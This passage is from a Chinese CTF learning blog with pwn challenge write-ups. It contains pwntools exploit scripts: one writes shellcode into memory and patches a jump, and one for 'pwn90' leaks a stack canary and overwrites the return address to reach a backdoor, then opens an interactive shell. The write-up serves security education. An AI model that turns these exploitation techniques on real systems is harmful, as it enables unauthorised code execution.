 syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_addr = text_addr + <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(shellcode):</span><br><span class="line">    write_data(shellcode_addr + i, byte)  <span class="comment"># 逐字节写入shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第四步：修正跳转偏移为+2（指向shellcode起始位置）</span></span><br><span class="line">corrected_offset = u32(asm(<span class="string">&#x27;jnz $+0x2&#x27;</span>)[<span class="number">1</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">write_data(text_addr + <span class="number">1</span>, corrected_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取交互式shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="pwn89"><a href="#pwn89" class="headerlink" title="pwn89"></a>pwn89</h2><p>这题我写在[canary](<a href="https://linkpwn.github.io/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/#%E8%A6%86%E7%9B%96TCB%E6%9D%A5%E5%AE%9E%E7%8E%B0%E5%AF%B9canary%E7%9A%84%E7%BB%95%E8%BF%87">pwn各类题型总结 | 网络幻影</a>)这块</p>
<h2 id="pwn-90"><a href="#pwn-90" class="headerlink" title="pwn 90"></a>pwn 90</h2><p>利用第一个read和printf泄露canary</p>
<p>再利用栈溢出将返回地址的最低位覆盖成后门地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28145</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收欢迎消息</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Welcome CTFshow:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造第一个payload：40字节填充 + 1字节覆盖Canary最低位</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收数据直到 &#x27;Hello &#x27; 后的内容</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Hello &#x27;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;:\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Received data length: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">48</span>:</span><br><span class="line">    log.error(<span class="string">&quot;Did not receive enough data&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 Canary</span></span><br><span class="line">canary_leaked = data[<span class="number">41</span>:<span class="number">48</span>]       <span class="comment"># 我们发的 B 后面7字节</span></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span> + canary_leaked  <span class="comment"># Canary 高位补 \x00</span></span><br><span class="line">canary_val = u64(canary.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;Leaked canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary_val)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造第二个payload</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span> + p64(canary_val) + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x3f&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试查看payload</span></span><br><span class="line"><span class="comment">#log.info(&quot;Payload2 dump:&quot;)</span></span><br><span class="line"><span class="comment">#print(hexdump(payload2))</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 交互模式</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="linkpwn"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">linkpwn</p>
  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">74</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">linkpwn</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

<!--单击显示文字-->
<script type="text/javascript" src="/js/clickshowtext.js"></script>

<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/clicklove.js"></script>

<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>
